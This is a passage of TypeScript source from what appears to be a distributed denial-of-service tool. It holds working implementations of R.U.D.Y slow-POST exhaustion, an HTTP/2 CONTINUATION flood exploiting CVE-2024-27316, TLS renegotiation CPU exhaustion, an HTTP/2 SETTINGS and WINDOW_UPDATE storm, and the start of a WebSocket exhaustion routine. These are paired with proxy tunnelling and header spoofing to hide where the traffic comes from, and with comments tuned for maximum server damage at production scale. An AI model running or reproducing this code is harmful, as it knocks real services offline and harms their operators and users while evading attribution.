      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 60)));
    }
  };

  const concurrency = Math.min(Math.max(2, Math.floor(threads / 60)), 20);
  await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
//
//  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
//  1-2 random bytes every 5-15 seconds. Apache/IIS/Tomcat allocate a
//  thread or goroutine per connection and hold it until the body completes.
//  With 30K connections open, the server's thread pool is completely
//  exhausted within seconds — all legitimate requests are queued forever.
//
//  Key difference from HTTP Exhaust: we NEVER send the full body.
//  The server waits indefinitely → threads = held → server = dead.
// ─────────────────────────────────────────────────────────────────────────
async function runRUDY(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data",
                  "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
                  "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
                  "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
  const MAX_CONN   = Math.min(threads * 100, 60000); // was 25K; 60K × 20KB TCP = 1.2GB
  const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever

  let localPkts = 0, localBytes = 0;
  const flush    = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv  = setInterval(flush, 300);

  // Each connection uses a raw TCP socket for precise byte-level control
  const oneRudy = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket | tls.TLSSocket = isHttps
      ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, timeout: 900_000 })
      : net.createConnection({ host: resolvedIp, port: tgtPort });

    sock.setNoDelay(true);
    sock.setTimeout(900_000); // 15 min — hold as long as possible

    let keepIv:   NodeJS.Timeout | null = null;
    let settled   = false;

    const cleanup = (reconnect = true) => {
      if (settled) return;
      settled = true;
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!signal.aborted && reconnect) {
        resolve(); // outer async runConn while-loop reconnects immediately
      } else { resolve(); }
    };

    const onConnected = () => {
      const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
      const ct      = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "application/json";
      // Send POST headers with enormous Content-Length — body NEVER completes
      const hdr = [
        `POST ${path} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Content-Type: ${ct}`,
        `Content-Length: ${FAKE_LEN}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.5`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `\r\n`,
      ].join("\r\n");
      sock.write(hdr);
      localPkts++;
      localBytes += hdr.length;

      // Trickle 1-2 bytes every 5-15 seconds — holds the server thread indefinitely
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(false); return; }
        const chunk = Buffer.from([randInt(0x61, 0x7a), randInt(0x30, 0x39)]); // random letters+digits
        const written = sock.write(chunk);
        localPkts++;
        localBytes += chunk.length;
        if (!written) { cleanup(true); } // backpressure = server overloaded
      }, randInt(5_000, 15_000));
    };

    if (isHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   () => cleanup(true));
    sock.once("timeout", () => cleanup(true));
    sock.once("close",   () => cleanup(true));

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  const runConn = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneRudy();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runConn));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP CONNECT TUNNEL — routes TCP through an HTTP proxy (RFC 7231 §4.3.6)
//  Sends "CONNECT host:port HTTP/1.1" and returns the raw socket after 200.
//  This tunnel is then used by tls.connect({socket: tunnel, ...}) so that
//  TLS-based attack methods (H2-storm, HPACK, Continuation, etc.) appear to
//  come from the proxy's IP, not the origin server.
// ─────────────────────────────────────────────────────────────────────────
function httpConnectTunnel(
  proxy:      ProxyConfig,
  targetHost: string,
  targetPort: number,
): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
    sock.setTimeout(8_000);

    const cleanup = (e: Error) => { try { sock.destroy(); } catch {/**/} reject(e); };

    sock.once("connect", () => {
      const authHdr = proxy.username
        ? `Proxy-Authorization: Basic ${Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64")}\r\n`
        : "";
      sock.write(
        `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
        `Host: ${targetHost}:${targetPort}\r\n` +
        `Proxy-Connection: keep-alive\r\n` +
        `${authHdr}\r\n`,
      );

      let buf = "";
      const onData = (chunk: Buffer) => {
        buf += chunk.toString("latin1");
        if (!buf.includes("\r\n\r\n")) return; // wait for end of headers
        sock.removeListener("data",    onData);
        sock.removeListener("error",   onErr);
        sock.removeListener("timeout", onTmo);
        if (/HTTP\/1\.[01] 2\d\d/.test(buf)) {
          resolve(sock);
        } else {
          cleanup(new Error(`CONNECT rejected: ${buf.split("\r\n")[0]}`));
        }
      };
      const onErr = (e: Error) => { sock.removeListener("data", onData); cleanup(e); };
      const onTmo = ()        => { sock.removeListener("data", onData); cleanup(new Error("CONNECT timeout")); };
      sock.on("data",    onData);
      sock.once("error", onErr);
      sock.once("timeout", onTmo);
    });

    sock.once("error",   reject);
    sock.once("timeout", () => cleanup(new Error("proxy connect timeout")));
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  mkTLSSock — creates a TLS socket, optionally through an HTTP proxy.
//  Falls back to direct when proxy fails or no proxies provided.
// ─────────────────────────────────────────────────────────────────────────
async function mkTLSSock(
  proxies:      ProxyConfig[],
  _idx:         number,
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  alpn:         string[] = ["h2"],
  extraOpts:    Partial<tls.ConnectionOptions> = {},
): Promise<tls.TLSSocket> {
  const opts: tls.ConnectionOptions = {
    servername: hostname, rejectUnauthorized: false,
    ALPNProtocols: alpn,
    ciphers: randomJA3Ciphers(),
    ...extraOpts,
  };
  if (proxies.length > 0) {
    const proxy = pickProxy(proxies);
    try {
      const tunnel = proxy.type === "socks5"
        ? await socks5Connect(proxy, hostname, targetPort)
        : await httpConnectTunnel(proxy, hostname, targetPort);
      recordProxySuccess(proxy.host, proxy.port);
      return tls.connect({ socket: tunnel, ...opts });
    } catch { recordProxyFailure(proxy.host, proxy.port); /* proxy failed — use direct */ }
  }
  return tls.connect({ host: resolvedHost, port: targetPort, ...opts });
}

// ─────────────────────────────────────────────────────────────────────────
//  SOCKS5 PROXY TUNNEL — routes TCP through a SOCKS5 proxy
//  Protocol: RFC 1928 (SOCKS5, no-auth method 0x00)
//  Returns a raw socket already tunneled to the target
// ─────────────────────────────────────────────────────────────────────────
function socks5Connect(
  proxy: ProxyConfig,
  targetHost: string,
  targetPort: number,
): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
    sock.setTimeout(8_000);
    let step = 0;
    const onData = (data: Buffer) => {
      if (step === 0) {
        // Step 1: greeting response — \x05\x00 = version 5, no-auth accepted
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 auth failed")); return;
        }
        // Step 2: CONNECT request — \x05\x01\x00\x03 <domain-len> <domain> <port>
        const hostBuf = Buffer.from(targetHost);
        const req = Buffer.allocUnsafe(7 + hostBuf.length);
        req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
        req[4] = hostBuf.length;
        hostBuf.copy(req, 5);
        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
        sock.write(req);
        step = 1;
      } else if (step === 1) {
        // Step 3: CONNECT response — \x05\x00 = success
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 CONNECT failed")); return;
        }
        sock.removeListener("data",    onData);
        sock.removeListener("error",   onError);
        sock.removeListener("timeout", onTimeout);
        resolve(sock); // tunnel open
      }
    };
    const onError   = (e: Error) => { sock.destroy(); reject(e); };
    const onTimeout = ()         => { sock.destroy(); reject(new Error("SOCKS5 timeout")); };
    sock.once("connect", () => {
      sock.on("data", onData);
      // Greeting: \x05\x01\x00 — version 5, 1 auth method, no-auth
      sock.write(Buffer.from([0x05, 0x01, 0x00]));
    });
    sock.on("error",   onError);
    sock.on("timeout", onTimeout);
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 CONTINUATION FLOOD — CVE-2024-27316
//
//  Sends HEADERS frames with END_HEADERS=0, followed by endless CONTINUATION
//  frames (also without END_HEADERS). The server must buffer all frames in
//  a reassembly queue until it sees END_HEADERS — which never arrives.
//  Result: OOM / CPU exhaustion on the server's H2 multiplexer.
//
//  Affected: nginx ≤1.25.4, Apache httpd ≤2.4.58, Envoy, HAProxy, IIS
//  CVE severity: CVSS 7.5 (HIGH)
// ─────────────────────────────────────────────────────────────────────────
async function runH2Continuation(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  // HTTP/2 binary framing helpers
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  // Client preface (RFC 7540 §3.5)
  const PREFACE    = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS   = mkFrame(0x04, 0x00, 0, Buffer.alloc(0)); // empty SETTINGS
  const SACK       = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // Minimal HPACK-encoded request headers (no Huffman for simplicity)
  const makeHpack = (host: string): Buffer => {
    const h = Buffer.from(host);
    return Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),   // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, h.length]), h,   // :authority literal with incremental indexing
    ]);
  };

  // CONTINUATION payload — fills each frame with 8–16 KB of garbage header data.
  // HTTP/2 spec (RFC 7540 §6.10) mandates the server buffer ALL CONTINUATION frames
  // for a stream before delivering to the app layer. Max frame size is 16384 bytes.
  // Increasing from 128-512B → 8192-16384B = 32× more RAM allocated per stream.
  // Server cannot reject mid-stream — it must buffer until END_HEADERS or connection reset.
  const makeCont = (streamId: number): Buffer => {
    const payload = Buffer.allocUnsafe(randInt(8192, 16384)); // was 128-512 — now max allowed
    for (let i = 0; i + 4 <= payload.length; i += 4)
      payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
    return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
  };
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 800); // 800 slots × 150KB = 120MB per worker

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const connectAndAttack = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {

    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    // Backpressure-aware write: if kernel buffer is full, wait for drain
    // before continuing — prevents unbounded buffer growth (OOM / silent drop)
    // Resolves on drain OR socket close/error so the Promise never leaks.
    const safeWrite = (buf: Buffer): Promise<void> => {
      if (sock.destroyed) return Promise.resolve();
      const ok = sock.write(buf);
      if (ok) return Promise.resolve();
      return new Promise<void>(r => {
        if (sock.destroyed) { r(); return; }
        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
        sock.once("drain", cleanup);
        sock.once("error", cleanup);
        sock.once("close", cleanup);
      });
    };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;

      // Pre-built SETTINGS frames for HPACK table oscillation
      // Sending SETTINGS_HEADER_TABLE_SIZE=0 before a CONTINUATION burst forces the server to
      // wipe its HPACK dynamic table AND buffer CONTINUATION frames simultaneously → double memory churn
      const mkSettingsHTS = (tableSize: number): Buffer => {
        const p = Buffer.allocUnsafe(6);
        p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
        p.writeUInt32BE(tableSize, 2);
        return mkFrame(0x04, 0x00, 0, p);
      };
      const SETTINGS_CLEAR  = mkSettingsHTS(0);     // wipes HPACK dynamic table entirely
      const SETTINGS_FULL   = mkSettingsHTS(65536); // restores 64KB HPACK table

      // Async attack loop: burst CONTINUATION frames per stream, then yield
      // Burst 100–500 × 8–16KB = 800KB–8MB per cycle — massive RAM pressure on server
      // while remaining within socket write-buffer bounds (checked via drain).
      let streamCount = 0;
      const attack = async (): Promise<void> => {
        while (!signal.aborted && !sock.destroyed) {
          // ★ SETTINGS OSCILLATION: every 4th stream, inject SETTINGS_HEADER_TABLE_SIZE=0
          // Forces server to wipe + reallocate HPACK table BEFORE buffering CONTINUATION
          // Compound effect: HPACK realloc overhead × CONTINUATION buffer pressure simultaneously
          if (streamCount % 4 === 0 && streamCount > 0) {
            await safeWrite(SETTINGS_CLEAR);  // wipe — server clears HPACK table immediately
            localPkts++; localBytes += SETTINGS_CLEAR.length;
            await safeWrite(SACK);            // ACK any server SETTINGS to keep session valid
            localPkts++; localBytes += SACK.length;
            // Brief yield — allows SETTINGS to be processed before we start the CONTINUATION burst
            await new Promise<void>(r => setImmediate(r));
          } else if (streamCount % 4 === 2 && streamCount > 0) {
            await safeWrite(SETTINGS_FULL);   // restore — server reallocates 64KB table
            localPkts++; localBytes += SETTINGS_FULL.length;
          }

          // HEADERS frame: END_STREAM=1 but NO END_HEADERS → forces server to buffer CONTINUATION
          const hpack = makeHpack(hostname);
          await safeWrite(mkFrame(0x01, 0x01, streamId, hpack));
          localPkts++; localBytes += 9 + hpack.length;

          // Flood CONTINUATION frames — each frame forces server to reallocate its HPACK state
          // Increased to 100–500 frames (was 50–300) × 8–16KB = 800KB–8MB per burst
          const burst = randInt(100, IS_PROD ? 500 : 150);
          for (let i = 0; i < burst && !sock.destroyed; i++) {
            const cf = makeCont(streamId);
            await safeWrite(cf);
            localPkts++; localBytes += cf.length;
          }

          // RFC 7540 §5.1.1: stream IDs are monotonically increasing, never reuse on same conn
          if (streamId > 0x7FFFFF00) { sock.destroy(); done(); return; }
          streamId += 2; // client uses odd stream IDs
          streamCount++;

          // Yield to event loop between bursts so flush/drain events can fire
          await new Promise<void>(r => setImmediate(r));
        }
        done();
      };
      attack().catch(() => done());
    });

    sock.on("data",    () => {}); // drain server GOAWAY / SETTINGS frames
    // async attack() loop exits when sock.destroyed or signal.aborted → calls done().
    // Do NOT reconnect here — the async while-loop in runSlot handles reconnection.
    sock.on("timeout", () => { sock.destroy(); });
    sock.on("error",   () => { /* sock auto-destroyed; attack() will exit via sock.destroyed */ });
    sock.on("close",   () => { done(); }); // ensure inner promise settles on unexpected close
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end connectAndAttack

  // ★ Async reconnect loop: exactly NUM_SLOTS concurrent connections at all times.
  // When a slot's connection dies, the while-loop immediately creates a new one — no
  // unbounded recursive promise accumulation, bounded memory = NUM_SLOTS × one socket.
  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await connectAndAttack();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TLS RENEGOTIATION DoS
//
//  Forces the server to perform a full TLS handshake repeatedly while the
//  connection is alive. Each renegotiation requires a full asymmetric-key
//  operation (~3ms on modern HW) — with 200 slots each renegotiating every
//  200ms = 3,000 handshakes/sec = ~9ms of CPU per core continuously.
//
//  Only works against TLS 1.2 — TLS 1.3 removed renegotiation.
//  Most CDN origins still offer TLS 1.2 via fallback.
// ─────────────────────────────────────────────────────────────────────────
async function runTLSRenego(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
  // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
  // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
  // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
  // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
  // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
  const RSA_PRIORITY_CIPHERS = [
    "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
    "AES128-GCM-SHA256",          // RSA key exchange, no FS
    "AES256-SHA256",              // RSA key exchange, CBC mode
    "AES128-SHA256",              // RSA key exchange, CBC mode
    "AES256-SHA",                 // RSA key exchange, older CBC
    "AES128-SHA",                 // RSA key exchange, older CBC
    "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
    "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
  ].join(":");

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    // Use mkTLSSock with RSA-priority ciphers + TLS 1.2 (required for renegotiation)
    const sock = await mkTLSSock(
      proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
      { maxVersion: "TLSv1.2" as tls.SecureVersion, ciphers: RSA_PRIORITY_CIPHERS }
    );
    sock.setTimeout(60_000);
    return new Promise<void>(resolve => {
    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    const doRenego = () => {
      if (signal.aborted || sock.destroyed) { done(); return; }
      try {
        sock.renegotiate({ rejectUnauthorized: false }, (err) => {
          if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
          localPkts++; localBytes += 2800; // ~2.8KB RSA TLS handshake (larger than ECDHE)
          // ★ v3: 20–60ms interval → 16–50 renegotiations/sec per slot (was 50–150ms / 7–20/s)
          // Tighter timing = more RSA private key operations per second on server CPU
          setTimeout(doRenego, randInt(20, 60));
        });
      } catch { done(); }
    };

    sock.once("secureConnect", () => {
      // Initial request: use OPTIONS /* to trigger CORS preflight processing (extra server work)
      sock.write(`OPTIONS * HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\nOrigin: https://${randIp()}.amazonaws.com\r\nAccess-Control-Request-Method: POST\r\n\r\n`);
      localPkts++; localBytes += 120;
      setTimeout(doRenego, 50); // start renegotiation at 50ms (was 100ms)
    });

    sock.on("data",    () => {});
    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
    }); // end inner Promise
  }; // end oneSlot

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      // v3: 50–100ms reconnect (was 150–300ms) → faster slot recycling, more RSA work on server
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(50, 100)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  H2 SETTINGS STORM
//
//  Attack in 3 simultaneous layers on each H2 connection:
//
//  Layer 1 — SETTINGS_HEADER_TABLE_SIZE storm:
//    Rapidly alternate HPACK table size 0 ↔ 65536. RFC 7541 §4.2: when size
//    decreases, the server MUST evict dynamic table entries until the table fits.
//    HPACK table size = 0 → server clears entire dynamic table.
//    HPACK table size = 65536 → server re-enables full 64KB table.
//    Each change triggers mandatory table eviction + state bookkeeping.
//    At 100+ changes/sec, server is locked in constant alloc/clear/alloc cycles.
//
//  Layer 2 — Half-open stream accumulation:
//    Open OPEN_STREAMS half-open streams (HEADERS without END_STREAM).
//    Server allocates state for each (goroutine / worker slot / connection context).
//    These streams block server resources while the SETTINGS storm runs.
//
//  Layer 3 — WINDOW_UPDATE flood on every open stream:
//    Repeatedly send WINDOW_UPDATE frames on all open streams + connection.
//    Server must process each to update its send flow-control state per stream.
//    RFC 7540 §6.9: each WINDOW_UPDATE triggers per-stream recalculation.
//
//  DEV: 60 slots | PROD: 400 slots
// ─────────────────────────────────────────────────────────────────────────
async function runH2SettingsStorm(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
  const OPEN_STREAMS = !IS_PROD ? 20 : 50; // PROD: 50 half-open streams × 800 slots = 40K pending streams (still effective)

  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SACK    = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // SETTINGS frame with single SETTINGS_HEADER_TABLE_SIZE (id=0x0001) param
  const mkSettingsHTS = (tableSize: number): Buffer => {
    const p = Buffer.allocUnsafe(6);
    p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
    p.writeUInt32BE(tableSize, 2);
    return mkFrame(0x04, 0x00, 0, p);
  };

  const SETTINGS_CLEAR = mkSettingsHTS(0);     // clears HPACK dynamic table entirely
  const SETTINGS_FULL  = mkSettingsHTS(65536); // restores 64KB HPACK table

  // RST_STREAM frame — forces server to immediately discard per-stream state
  const mkRST = (streamId: number, errorCode = 0): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(errorCode, 0); // 0=NO_ERROR — "nice" RST, still forces cleanup
    return mkFrame(0x03, 0x00, streamId, p);
  };

  // PRIORITY frame — forces server to recompute H2 priority dependency tree
  const mkPriority = (streamId: number, depStreamId: number, weight: number): Buffer => {
    const p = Buffer.allocUnsafe(5);
    p.writeUInt32BE(depStreamId & 0x7fffffff, 0); // exclusive=0 for simplicity
    p[4] = weight & 0xff;                          // weight 0-255
    return mkFrame(0x02, 0x00, streamId, p);
  };

  // WINDOW_UPDATE frame: stream 0 (connection) or stream N
  const mkWU = (streamId: number, increment: number): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(increment & 0x7fffffff, 0);
    return mkFrame(0x08, 0x00, streamId, p);
  };

  // HEADERS frame WITHOUT END_STREAM — opens a stream that server must keep alive
  const mkOpenHeaders = (sid: number): Buffer => {
    const hBuf = Buffer.from(hostname);
    const hpack = Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),     // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, hBuf.length]), hBuf, // :authority literal incremental-index
    ]);
    return mkFrame(0x01, 0x04, sid, hpack); // 0x04 = END_HEADERS only (no END_STREAM)
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {
      let settled = false;
      const done  = () => { if (!settled) { settled = true; resolve(); } };

      sock.once("secureConnect", () => {
      // Send client preface + initial SETTINGS (full table) + ACK
      sock.write(Buffer.concat([PREFACE, SETTINGS_FULL, SACK]));
      localPkts++; localBytes += PREFACE.length + SETTINGS_FULL.length + SACK.length;

      // Open OPEN_STREAMS half-open streams (no END_STREAM → server holds them open)
      let topStreamId = 1;
      for (let i = 0; i < OPEN_STREAMS; i++) {
        const f = mkOpenHeaders(topStreamId);
        sock.write(f);
        localPkts++; localBytes += f.length;
        topStreamId += 2;
      }

      // Also expand connection-level window to max so server can send data
      const connWU = mkWU(0, 0x3fffffff);
      sock.write(connWU);
      localPkts++; localBytes += 13;

      // Storm loop — run as fast as the event loop allows
      // Frames are small (15B SETTINGS + 13B × OPEN_STREAMS WU) so no backpressure needed
      let toggle = false;
      let stormCount = 0;
      const storm = () => {
        if (signal.aborted || sock.destroyed) { done(); return; }

        // Layer 1: alternate SETTINGS_HEADER_TABLE_SIZE (clear ↔ full)
        // Each change forces server to evict/restore entire HPACK dynamic table
        const settings = toggle ? SETTINGS_CLEAR : SETTINGS_FULL;
        toggle = !toggle;
        sock.write(settings);
        localPkts++; localBytes += settings.length;

        // Layer 2: PRIORITY frames — forces server to recompute H2 dependency tree
        // Rotate weights and dependency IDs to maximize tree-rebalancing CPU cost
        for (let sid = 1; sid < topStreamId; sid += 2) {
          const depSid = (sid === 1) ? 3 : 1; // circular dependency (harmless for us)
          const w = randInt(1, 255);
          const pf = mkPriority(sid, depSid % topStreamId || 1, w);
          sock.write(pf);
          localPkts++; localBytes += pf.length;
        }

        // Layer 3: WINDOW_UPDATE on every open stream + connection
        // Moderate increment (8192) to stay well below the 2^31-1 overflow boundary
        for (let sid = 1; sid < topStreamId; sid += 2) {
          const wu = mkWU(sid, 8192);
          sock.write(wu);
          localPkts++; localBytes += 13;
        }
        const cWU = mkWU(0, 8192);
        sock.write(cWU);
        localPkts++; localBytes += 13;

        // Layer 4: RST_STREAM every 3 iterations (keeps server cleaning up state)
        // After RST, we re-open the stream on next cycle → server must allocate again
        if (stormCount % 3 === 2) {
          for (let sid = 1; sid < topStreamId; sid += 2) {
            const rst = mkRST(sid, 0); // NO_ERROR — server must clean up stream state
            sock.write(rst);
            localPkts++; localBytes += rst.length;
          }
          // Re-open streams after RST so they can be targeted again next iteration
          for (let i = 0; i < OPEN_STREAMS; i++) {
            const newSid = topStreamId + (i * 2);
            const f = mkOpenHeaders(newSid);
            sock.write(f);
            localPkts++; localBytes += f.length;
          }
          topStreamId += OPEN_STREAMS * 2;
          // Cap stream ID before H2 limit (2^31-1) — reset connection if exceeded
          if (topStreamId > 0x40000000) { sock.destroy(); done(); return; }
        }
        stormCount++;

        setImmediate(storm);
      };
      storm();
    });

      sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
      sock.on("timeout", () => { sock.destroy(); done(); });
      sock.on("error",   () => { done(); });
      sock.on("close",   () => { done(); });
      signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneSlot

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WEBSOCKET EXHAUSTION
//
//  Opens thousands of WebSocket connections and holds them open with periodic
//  pings (every 20s). Servers allocate a goroutine/thread/fiber per WS
//  connection — far more expensive than HTTP since WS is stateful.
//  nginx: reserves a keepalive_requests slot + worker_connection slot per WS.
//  Node.js targets: allocates an EventEmitter + parser per ws socket.
//
//  DEV cap: 400 sockets | PROD: 5,000 sockets
// ─────────────────────────────────────────────────────────────────────────
async function runWSFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
